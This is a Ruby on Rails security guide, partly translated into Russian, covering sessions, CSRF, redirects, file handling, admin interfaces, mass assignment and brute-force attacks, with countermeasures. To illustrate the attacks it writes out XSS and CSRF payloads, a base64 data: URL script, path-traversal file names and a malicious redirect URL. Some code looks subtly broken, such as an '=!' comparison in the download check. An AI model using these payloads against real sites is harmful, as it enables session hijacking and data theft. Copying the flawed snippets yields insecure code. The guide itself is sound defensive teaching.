h2. Гид по безопасности в Ruby On Rails 

Данное руководство описывает основные проблемы безопасности в web-приложениях и пути их избежания в Rails. Если у Вас есть какие-то вопросы или предложения, пожалуйста, свяжитесь со мной, Heiko Webers, at 42 {_et_} rorsecurity.info.
После прочтения вы будете знакомы со следующими вопросами:

* Все способы противодействия атаками _(highlight)которые отмечены_
* Концепция сессий в Rails, что туда можено поместить и популярные методы атаки
* Как простое посещение сайта может быть проблемой в безопасности (с CSRF)
* На что необходимо обратить внимание при работе с файлами и обеспечении администраторского интерфейса
* Специфическая для Rails проблема массового присваивания
* Как управлять пользователями: логин/логаут и методы атак на всех уровнях
* Все самые популярные методы атак с использованием инъекций

endprologue.

h3. Введение

Назначение фреймворков состоит в том, чтобы помочь разработчикам создавать web-приложения. Некоторые из них также помогают в решении проблем обеспечения безопасности. Однако ни один фреймворк не хуже другого в вопросах безопасности: если вы используете фреймворк правильно, вы сможете создавать безопасные web-приложения. В Ruby on Rails есть полезные хелперы реализующие, к примеру, защиту от SQL инъекций, поскольку это довольно серьезная проблема. Это здорово, что все рельсовые приложения, аудитом которых я занимался имеют довольно хороший уровень безопасности.

В общем, нет такой вещи как встроенный в фреймворк механизм обеспечения безопасности, поскольку это зависит от человека, который работает с фреймворком и его методов работы. Эта зависимость существует на всех уровня работы приложения, от фронт-энда до бэк-энда.

По оценке Gartner Group 75% атак в интернете происходят на уровне веб-приложения. Был проведен аудит более чем 300 сайтов, 97% из них оказались уязвимы к атакам. Это происходит потому, что веб-приложения относительно просто атаковать, так как их довольно просто понять и манипулировать ими даже человеку со стороны.

Угрозы которым подвержены веб-приложения включают кражу учетной записи пользователя, чтение и изменение важных данных, предоставление подложных данных. Также, атакующий может установить троянскую программу или вирус рассылающий электронные письма, направленные на дискредитацию торговой марки или финансовое обогащение злоумышленника. Чтобы предотвратить возможные атаки, минимизировать их последствия и удалить уязвимости, необходимо владеть методами атаки. Именно этот вопрос рассматривается в данном руководстве.

Для разработки безопасных веб-приложений необходимо знать своего врага в лицо, всегда быть в курсе последних новостей по вопросам безопасности. Для этого рекомендуется подписаться на рассылки статей по безопасности, читать соответсвующие блоги (см. главу <a href="#additional-resources">Дополнительные ресурсы</a>). Именно так я нахожу опасные проблемы с безопасностью.

h3. Сессии

Начать рассмотрение вопросов безопасности лучше с изучения механизмов работы сессии.

h4. Что такое сессии?

-- _HTTP -- это протокол без сохранения состояния. Сессии же позволяют сохранять состояние._

Многим приложениям необходимо отслеживать состояние определенных пользователей. К примеру, это может быть содержимое корзины в он-лайн магазине, или идентификатор залогиненного пользователя. Без механизма сессий пользователю пришлось бы подтверждать свою личность при каждом запросе к серверу.
Rails создаст новую сессию автоматически, как только новый пользователь начнет работать с приложением и загрузит существующую сессию, если пользователь уже работал с приложением.

Обычно сессия состоит из хэша значений и ключа сессии, обычно 32-символьной строки, идентифицирующей хэш. Каждая cookie отсылаемая клиенту включает идентификатор сессии, или есть другой вариант: браузер посылает идентификатор сессии серверу при каждом запросе. В Rails можно получать и сохранять значения в сесси используя следующий метод:

<ruby>
session[:user_id] = @current_user.id
User.find(session[:user_id])
</ruby>

h4. Идентификатор сессии

-- _Идентификатор сессии это MD5 хэш длиной 32 байта._

A session id consists of the hash value of a random string. The random string is the current time, a random number between 0 and 1, the process id number of the Ruby interpreter (also basically a random number) and a constant string. Currently it is not feasible to brute-force Rails' session ids. To date MD5 is uncompromised, but there have been collisions, so it is theoretically possible to create another input text with the same hash value. But this has had no security impact to date.

h4. Кража сессии

-- _Кража сессии позволяет злоумышленнику использовать веб-приложение под чужим именем._

Многие веб-приложение имеют систему аутентификации: пользователь вводит имя и пароль, которые проверяются на сервере, и, в случае успеха в сессию записывается идентификатор пользователя. Начиная с этого момента, на сервере существует валидная сессия, идентифицируемая ключом, который отправляется пользователю (обычно сохраняется в cookies). При каждом запросе браузер пользователя предоставляет этот ключ чтобы приложение могло идентифицировать пользователя.

Таким образом, cookie служит временным подтвержением подлинности пользователя для веб-приложение. Любой, завладевший cookie, может выдать себя за настоящего владельца cookie и работать с приложением от его имени. Вот некоторые способы кражи сессии и контрмеры:

* Сканирование незащищенного через SSL соединения на предмет передачи cookies. Например, нешифрованная беспроводная сеть подволяет прослушивать траффик каждого клиента сети. Это одна из причин остерегаться работать в кафе. Чтобы избежать этой уязвимости создатель веб-приложения должен _(highlight)предоставить защищенное соединение SSL_.

* Большинство людей не удаляют cookies после работы с публичным компьютером. Это означает, что если последний пользователь компьютера не разлогинился на сайте, вы можете продолжать работать от его имени. Разработчик приложение должен _(highlight)предоставить пользователю возможность разлогиниться и сделать кнопку "Выйти" заметной_.

* Многие межсайтовые атаки (XSS, cross-site scripting) направлены на кражу cookies. Позже мы <a href="#cross-site-scripting-xss">подробнее коснемся вопросов XSS</a>.

* Вместо кражи cookie, атакующий может подменить cookie жертвы на свои. Это называется фиксацией сессии, разговор об этом позже.

Главная цель большинства атакующих -- деньги. Стоимость банка краденых логинов на черном рынке составляет $10–$1000 (в зависимости от имеющихся средств), $0.40–$20 за номера кредиток, $1–$8 за аккаунты на он-лайн аукционах и $4–$30 за пароли email, по данным "Symantec Global Internet Security Threat Report":http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf.

h4. Принцип работы с сессиями

-- _Основные руководящие принципы при работе с сессиями._

* _(highlight)Не хранить тяжелых данных в сессии_. Вместо этого их надо хранить в базе данных, а в сессии сохранять только идентификаторы. Это устранит головную боль с синхронизацией данных и переполнением хранилища сессии (зависит от того, какое хранилище для сесси выбрано, об этом ниже).
Это также решит проблемы, если вы вдруг измените структуру объекта сохраненного в сессии, а старые версии объекта будут сохранены в пользовательских сессиях. Управлять сессионными данными проще, когда они на сервере.

* _(highlight)Нельзя хранить важные данные в сессии_. Если пользователь удалит cookies на своем браузере, эти данные будут безвозвратно утрачены. А если сессия хранится на клиентской стороне, эти данные могут быть прочитаны пользователем или третьим лицом.


h4. Хранилище сессий

-- _Rails предоставляет несколько механизмов хранения сессий. Основные это ActiveRecordStore и CookieStore._

There are a number of session storages, i.e. where Rails saves the session hash and session id. В основном в реальных приложениях выбирают ActiveRecordStore (или один из наследников) исходя из критериев производительности и технического обслуживания. ActiveRecordStore хранит данные сесси в БД и получает их при каждом запросе.

По умолчанию в вторых Рельсах используется вариант хранения CookieStore. CookieStore сохраняет хеш сессии непосредственно в cookies на стороне клиента. Сервер получает данные сессии напрямую из cookie, что исключает необходимость в идентификаторе сессии. Этот вариант хорош с точки зрения производительности программы, однако довольно спорен по вопросам безопасности.

* Размер данных, сохраняемых в cookies не может превышать 4 килобайта. С одной стороны это хорошо, поскольку не позволяет хранить большие наборы данных в сессии, о чем говорилось выше. _(highlight)Для хранения текущего идентификатора пользователя в сессии обычно хватает места_.

* Клиент может видеть все что вы сохраняете в сессию, поскольку данные хранятся в виде обычного текста (либо Base64-закодированные, но не зашифрованные). Разумеется, _(highlight)какие-либо секретные данные нельзя хранить так_. Для предотвращения фальсификации данных в cookies на стороне клиента контрольная сумма cookies вычисляется на сервере используя секретный ключ, а затем сохранятся в cookies.

Это означает, что безопасность такого хранилища зависит от секретного ключа (и алгоритма подсчета контрольной суммы, обычно это SHA512, который пока ещё не был скомпрометирован). Поэтому _(highlight)не используйте тривиальный ключ, т.е. слово из словаря, или любое короче 30 символов_. Секретный ключ надо поместить в environment.rb:

<ruby>
config.action_controller.session = {
  :key    => '_app_session',
  :secret => '0x0dkfj3927dkc7djdh36rkckdfzsg...'
}
</ruby>

Однако, есть наследники класса CookieStore, которые шифруют данные, хранимые в cookies, так что клиент не может их видеть.

h4. Атака повтором (Replay Attack) для сессий, использующих CookieStore.

-- _Еще один тип атак, которым подвержены сессии использующие CookieStore -- это атаки повтором._

Атакующий действует так:

* Пользователь получает некоторый кредит, величина которого хранится в сессии (вообще, нельзя так делать, мы делаем это чтобы далеко не ходить за примером).
* Пользователь покупает что-то.
* Обновленное состояние кредита (меньше, чем было) сохраняется в сессии.
* Пользователь заменяет cookies на те, которые он сохранил на первом шаге.
* И он получает назад свой изначальный кредит.

Включение текущего времени (или случайной величины) в сессию предотвращает атаку повтором. Эта величина долна быть валидна в течении одного запроса. Сервер должен учитывать все валидные величины, что становится более сложной задачей, если сайт работает на нескольких серверах. В этом случае валидные значения приходится хранить в базе, что противоречит главной цели CookieStore (не обращаться к базе при каждом запросе).

Лучшим решением этой проблемы будет _(highlight)никогда не хранить данные такого рода в сессии, а помещать их в базу данных_. Для данного случая правильным было бы хранить величину кредита в базе, а идентификатор пользователя в сессии.

h4. Фиксация сессии

-- _Вместо того, чтобы красть сессию пользователя, атакующий может подменить легитимного пользователя своей сессией, это называется фиксацией сессии._

!images/session_fixation.png(Session fixation)!

Эта атака основывается на фиксировании идентификатора сессии атакующего и замене пользовательской сессии зафиксированной сессией атакующего. Поскольку пользователь использует сессию атакующего, нет необходимости красть сессию потом. Вот как работает этот метод атаки:

# Атакующий создает валидную сессию: он загружает страничку входа на сайт, где требуется ввести логин и пароль и фиксирует сессию в этом месте, то есть сохраняет cookies из ответа сервера. (см. номер 1 и 2 на иллюстрации).
# Возможно, атакующий время от времени перезагружет страничку, чтобы сессия не была удалена по истечению срока действия (если сократить время жизни сессии до 20 минут, это значительно сократит временное окно для атаки).
# Теперь задачу атакующего заставить пользователя использовать зафиксированную сессию (см. номер 3 на иллюстрации). Поскольку нельзя менять cookie чужого домена (это ограничение безопасности для cookies), атакующий должен запустить JavaScript с того же домена, что и атакуемое приложение. Инъекция JavaScript кода в приложение посредством XSS производит эту атаку. Пример: +&lt;script&gt; document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9"; &lt;/script&gt;+. Позже мы подробнее рассмотрим XSS инъекции.
# Злоумышленник заманивает жертву на зараженную javascript кодом страницу. Как только жертва заходит на зараженную страницу, его браузер заменит существующую сессию на зафиксированную сессию-ловушку.
# Поскольку сессия-ловушка не зарегистрирована, система попросит пользователя ввести логин ии пароль.
# После того, как пользователь залогинится на сайте, и атакующий и жертва будут разделять одну сессию: сессия будет валидна и жертва не будет подозревать об атаке.

h4. Фиксация сессии – контрмеры

-- _Одна строчка кода защитит от фиксации сессии._

Наиболее эффективный способ противодействия это атаке -- _(highlight)создание новой сессии_ после успешного входа в систему. В этом случае атакующий не сможет использовать зафиксированную сессию. Это также хорошая мера противодействия против кражи сессии. Так создается новая сессия в Rails:

<ruby>
reset_session
</ruby>

Если вы используете популярный плагин RestfulAuthentication для управления пользователями, добавьте reset_session в SessionsController#create. Заметьте, что это удалит все значения из старой сессии, _(highlight)необходимо будет перенести их в новую сессию_.

Другая мера обхода фиксации сессии состоит в том, чтобы _(highlight)сохранять в сессии данные, специфичные для пользователя_, проверяя их при каждом запросе, и запрещать доступ, если информация не совпала. В качестве такой информации может выступать, например, IP адрес пользователя или имя браузера. Однако, когда сохраняете IP адрес, следует помнить, что многие интернет-провайдеры и крупные организации предоставляют выход в интернет своим пользователям через прокси. В этом случае все компьютеры подсети будут иметь один общий IP адрес. _(highlight)Также этот IP адрес может измениться в течении сессии_, и такие пользователи не смогут в полной мере воспользоваться Вашим приложением.

h4. Время жизни сессии

-- _Если сессия никогда не устаревает, это увеличивает временной интервал для таких атак, как межсайтовая подделка запроса (CSRF), кража или фиксация сессии._

Один из способов -- хранить временную метку сессии в cookies, однако безопаснее отслеживать время жизни сесси на сервере, поскольку клиент может изменить временную метку, хранящуюся в cookie. Вот пример того, как можно _(highlight)управляеть временем жизни сессии используя базу данных_. Вызов +Session.sweep("20m")+ удалит сессии, бездействующие более 20 минут.

<ruby>
class Session < ActiveRecord::Base
 def self.sweep(time_ago = nil)
     time = case time_ago
       when /^(\d+)m$/ then Time.now - $1.to_i.minute
       when /^(\d+)h$/ then Time.now - $1.to_i.hour
       when /^(\d+)d$/ then Time.now - $1.to_i.day
       else Time.now - 1.hour
     end
     self.delete_all "updated_at < '#{time.to_s(:db)}'"
   end
 end
</ruby>

В секции о фиксации сессии затрагивалась проблема поддержки сессии от устаревания. Атакующий может периодически посылать запросы серверу, поддерживая сессию в "живом" состоянии. Простейшим решением в данном случае будет хранить время создания сессии и удалять сесси, созданные очень давно. Для реализации этого просто добавьте столбец created_at в таблицу сессий, и используйте следующий код в методе sweep выше:

<ruby>
self.delete_all "updated_at < '#{time.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
</ruby>

h3. Межсайтовая подделка запроса (CSRF, Cross-Site Request Forgery)

-- _Эта атака работает при помощи включения вредоносного кода или ссылки на странице, которая обращается к веб-приложению, в котором пользователь, вероятно, залогинен. Если сессия пользователя в этом приложении не устарела, тогда атакующий может выполнить неавторизованные команды._

!images/csrf.png!

В <a href="#сессии">главе Сессии</a> мы узнали, что многие Rails приложения используют сессии основанные на cookies. Вне зависимости от того, хранится ли сессия целиком в cookies, хранится ли она в базе данных (в этом случае все равно на клиенте будет cookie с идентификатором сессии), идея идентификации браузера сервером основана на наличии у клиента cookies, которые передаются серверу при каждом запросе. Проблема в том, что браузер не учитывает, с какого сайта идет запрос -- cookie все равно будут отправлены. Рассмотрим пример того, как это можно использовать:

* Владимир просматривает форум, на котором хакер поместил тему, в тексте которой присутствует картинка, в качестве атрибута scr которой указана ссылка на команду в веб-приложении по управлению проектами, с которым работает Владимир.
* +&lt;img src="http://www.webapp.com/project/1/destroy"&gt;+
* Сессия Владимира на www.webapp.com активна, поскольку он не разлогинился по какой-то причине (возможно,  продолжает работать параллельно, либо просто никогда не делает этого в течении рабочего дня, чтобы не вводить постоянно пароль).
* Когда браузер Владимира пытается отобразить сообщение хакера, он встречает тэг с изображением, которое ссылается на www.webapp.com. Как было объяснено выше, сессия Владимира на www.webapp.com открыта.
* Приложение по адресу www.webapp.com проверяет корректность cookies, отправленных с запросом, узнает в пользователе Владимира и удаляет проект с ID 1. В качестве результата он возвращает конечно же не картинку, и, посколько этот ответ не ожидается браузером, картинка не будет отображена.
* Владимир не подозревает об атаке -- через пару дней он заметит, что проекта номером один нет.

Заметьте, что не имеет значения, на каком домене находится вредоносный код (картинка, в данном случае), он может быть где угодно -- на форуме, в блоге или в email.

CSRF докольно редко появляется в CVE (Common Vulnerabilities and Exposures) -- менее 0.1% в 2006 -- но на самом деле это 'спящий гигант' [Grossman]. Эти данные резко контрастируют с результатами моих (и не только моих) работ по аудиту безопасности – _(highlight)CSRF - это очень важная проблема_.

h4. Противодействие CSRF

-- _Во-первых, как рекомендует W3C, GET и POST запросы необходимо использовать надлежащим образом. Во-вторых, необходимо использовать маркер безопасности для любых не-GET запросов для защиты веб-приложений от CSRF._

HTTP протокол базируется на использовании запросов двух основных типов - GET и POST (есть и другие, не поддерживаемые многими браузерами). Интернет Консорциум (W3C, World Wide Web Consortium) рекомендует выбирать между POST и GET следующим образом:

*Использовать GET если:*

* Взаимодействие подразумевает _(highlight)вопрос_ (т.е., безопасная операция, например запрос, операция чтения данных, поиск).

*Использовать POST если:*

* Взаимодействие носит характер _(highlight)приказа_, или
* Взаимодействие _(highlight)изменяет состояние_ каких-либо ресурсов, или
* Пользователь _(highlight)несет ответственность за_ результаты взаимодействия.

Если Ваше веб-приложение RESTful, Вы можете использовать HTTP запросы, такие как PUT или DELETE. В основном, современные браузеры не поддерживают дополнительные типы запросов. Пользователи Rails используют скрытое поле +_method+ чтобы обойти это ограничение.

_(highlight)Метод verify контроллера позволяет убедиться, что определенные действия не могут быть произведены используя GET запрос_. Вот пример использования verify для действия transfer через POST. Если придет запрос любого другого типа, произойдет перенаправление на действие list.

<ruby>
verify :method => :post, :only => [:transfer], :redirect_to => {:action => :list}
</ruby>

С такой предосторожностью атаки извне не будут работать, поскольку браузер посылает GET запрос для получение картинок, а этот запрос не принимается веб-приложением.

Однако, это только первый шаг, поскольку _(highlight)POST запросы тоже могут быть отправлены автоматически_. Например, вот ссылка, которая отображается как  www.harmless.com в строке состояния браузера, но фактически создает новую форму и отправляет ее используя POST запрос.

<html>
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
</html>

Либо, атакующий может поместить такой-то javascript на событие onmouseover изображения:

<html>
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
</html>

Есть также много других возможностей, включая Ajax для проведения атаки в фоне.   _(highlight)Решением в данном случае будет использовать маркер безопасности для не-GET запросов_ и проверять его не стороне сервера. В Rails 2 и выше, это реализуется одной строкой кода в контроллере приложения:

<ruby>
protect_from_forgery :secret => "123456789012345678901234567890..."
</ruby>

Теперь во все формы и Ajax-запросы сгенерированные Rails автоматически будут добавлены маркеры безопасности, вычисляемые по текущему идентификатору сессии и секретному ключу на сервере. Вам не нужен секретный ключесли Вы используете CookieStorage в качестве сессионного хранилища. Это вызовет исключение ActionController::InvalidAuthenticityToken если маркер безопасности не совпадет с ожидаемым.

Заметьте, что _(highlight)межсайтовый скриптинг (XSS, cross-site scripting) обходит все защиты от CSRF_. XSS предоставляет атакующему доступ ко всем элементам на странице, так что он сможет прочитать маркер безопасности из вормы или напрямую отправить форму. С этими уязвимостями мы <a href="#cross-site-scripting-xss">ознакомимся позже</a>.

h3. Перенаправление, работа с файлами

Другой класс уязвимостей -- использование перенаправлений и файлов в веб-приложениях.

h4. Перенаправление

-- _Перенаправление в веб-приложениях - это недооцененный инструмент взломщика: Not only can the attacker forward the user to a trap web site, he may also create a self-contained attack._

Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. Here is an example of a legacy action:

<ruby>
def legacy
  redirect_to(params.update(:action=>'main'))
end
</ruby>

This will redirect the user to the main action if he tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can exploited by an attacker if he includes a host key in the URL:

<plain>
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
</plain>

If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to _(highlight)include only the expected parameters in a legacy action_ (again a whitelist approach, as opposed to removing unexpected parameters). _(highlight)And if you redirect to an URL, check it with a whitelist or a regular expression_.

h5. Автономный XSS

Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:

+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K+

This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, _(highlight)do not allow the user to supply (parts of) the URL to be redirected to_.

h4. Загрузка файлов на сервер

-- _Make sure file uploads don't overwrite important files, and process media files asynchronously._

Many web applications allow users to upload files. _(highlight)File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so – one more reason to run web servers, database servers and other programs as a less privileged Unix user.

When filtering user input file names, _(highlight)don't try to remove malicious parts_. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “....//” - the result will be “../”. It is best to use a whitelist approach, which _(highlight)checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the "attachment_fu plugin":http://github.com/technoweenie/attachment_fu/tree/master:

<ruby>
def sanitize_filename(filename)
  returning filename.strip do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.gsub! /^.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
</ruby>

A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its _(highlight)vulnerability to denial-of-service attacks_. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.

The solution to this is best to _(highlight)process media files asynchronously_: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.

h4. Исполняемый код в загружаемых на сервер файлах

-- _Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory._

The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file “file.cgi” with code in it, which will be executed when someone downloads the file.

_(highlight)If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level downwards.

h4. Скачивание файлов с сервера

-- _Make sure users cannot download arbitrary files._

Just as you have to filter file names for uploads, you have to do so for downloads. The send_file() method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:

<ruby>
send_file('/var/www/uploads/' + params[:filename])
</ruby>

Simply pass a file name like “../../../etc/passwd” to download the server's login information. A simple solution against this, is to _(highlight)check that the requested file is in the expected directory_:

<ruby>
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename =!
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, :disposition => 'inline'
</ruby>

Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.

h3. Интранет и безопасность администрирования

-- _Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world._

In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF. 

*XSS*  If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.

Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.

Refer to the Injection section for countermeasures against XSS. It is _(highlight)recommended to use the SafeErb plugin_ also in an Intranet or administration interface.

*CSRF*  Cross-Site Reference Forgery (CSRF) is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.

A real-world example is a "router reconfiguration by CSRF":http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had his credentials stolen.

Another example changed Google Adsense's e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials. 

Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.

For _(highlight)countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.

h4. Дополнительные предосторожности

The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:

* It is very important to _(highlight)think about the worst case_: What if someone really got hold of my cookie or user credentials. You could _(highlight)introduce roles_ for the admin interface to limit the possibilities of the attacker. Or how about _(highlight)special login credentials_ for the admin interface, other than the ones used for the public part of the application. Or a _(highlight)special password for very serious actions_?

* Does the admin really have to access the interface from everywhere in the world? Think about _(highlight)limiting the login to a bunch of source IP addresses_. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.

* _(highlight)Put the admin interface to a special sub-domain_ such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.

h3. Массовое присваивание

-- _Without any precautions Model.new(params[:model]) allows attackers to set any database column's value._

The mass-assignment feature may become a problem, as it allows an attacker to set any model's attributes by manipulating the hash passed to a model's +new()+ method:

<ruby>
def signup
  params[:user] #=> {:name => “ow3ned”, :admin => true}
  @user = User.new(params[:user])
end
</ruby>

Mass-assignment saves you much work, because you don't have to set each value individually. Simply pass a hash to the new() method, or assign attributes=(attributes) a hash value, to set the model's attributes to the values in the hash. The problem is that it is often used in conjunction with the parameters (params) hash available in the controller, which may be manipulated by an attacker. He may do so by changing the URL like this:

<pre>
"name":http://www.example.com/user/signup?user=ow3ned&user[admin]=1
</pre>

This will set the following parameters in the controller:

<ruby>
params[:user] #=> {:name => “ow3ned”, :admin => true}
</ruby>

So if you create a new user using mass-assignment, it may be too easy to become an administrator.

Note that this vulnerability is not restricted to database columns.  Any setter method, unless explicitly protected, is accessible via the <tt>attributes=</tt> method.  In fact, this vulnerability is extended even further with the introduction of nested mass assignment (and nested object forms) in Rails 2.3.  The +accepts_nested_attributes_for+ declaration provides us the ability to extend mass assignment to model associations (+has_many+, +has_one+, +has_and_belongs_to_many+).  For example:

<ruby>
  class Person < ActiveRecord::Base
    has_many :credits

    accepts_nested_attributes_for :children
  end

  class Child < ActiveRecord::Base
    belongs_to :person
  end  
</ruby>

As a result, the vulnerability is extended beyond simply exposing column assignment, allowing attackers the ability to create entirely new records in referenced tables (children in this case).

h4. Контрмеры

To avoid this, Rails provides two class methods in your Active Record class to control access to your attributes. The +attr_protected+ method takes a list of attributes that will not be accessible for mass-assignment. For example:

<ruby>
attr_protected :admin
</ruby>

A much better way, because it follows the whitelist-principle, is the +attr_accessible+ method. It is the exact opposite of +attr_protected+, because _(highlight)it takes a list of attributes that will be accessible_. All other attributes will be protected. This way you won't forget to protect attributes when adding new ones in the course of development. Here is an example:

<ruby>
attr_accessible :name
</ruby>

If you want to set a protected attribute, you will to have to assign it individually:

<ruby>
params[:user] #=> {:name => "ow3ned", :admin => true}
@user = User.new(params[:user])
@user.admin #=> false # not mass-assigned
@user.admin = true
@user.admin #=> true
</ruby>

A more paranoid technique to protect your whole project would be to enforce that all models whitelist their accessible attributes.  This can be easily achieved with a very simple initializer:

<ruby>
ActiveRecord::Base.send(:attr_accessible, nil)
</ruby>

This will create an empty whitelist of attributes available for mass assignment for all models in your app.  As such, your models will need to explicitly whitelist accessible parameters by using an +attr_accessible+ declaration.  This technique is best applied at the start of a new project.  However, for an existing project with a thorough set of functional tests, it should be straightforward and relatively quick to insert this initializer, run your tests, and expose each attribute (via +attr_accessible+) as dictated by your failing tests.

h3. Управление пользователями

-- _Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure._

There are some authorization and authentication plug-ins for Rails available. A good one saves only encrypted passwords, not plain-text passwords. The most popular plug-in is +restful_authentication+ which protects from session fixation, too. However, earlier versions allowed you to login without user name and password in certain circumstances.

Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):

<plain>
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
</plain>

This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:

<ruby>
User.find_by_activation_code(params[:id])
</ruby>

If the parameter was nil, the resulting SQL query will be

<sql>
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
</sql>

And thus it found the first user in the database, returned it and logged him in. You can find out more about it in "my blog post":http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/. _(highlight)It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.

h4. Брут-форс атаки аккаунтов

-- _Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA._

A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user name's and a dictionary, an automatic program may find the correct password in a matter of minutes.

Because of this, most web applications will display a generic error message “user name or password not correct”, if one of these are not correct. If it said “the user name you entered has not been found”, an attacker could automatically compile a list of user names.

However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.

In order to mitigate such attacks, _(highlight)display a generic error message on forgot-password pages, too_. Moreover, you can _(highlight)require to enter a CAPTCHA after a number of failed logins from a certain IP address_. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.

h4. Кража аккаунтов

-- _Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?_

h5. Пароли

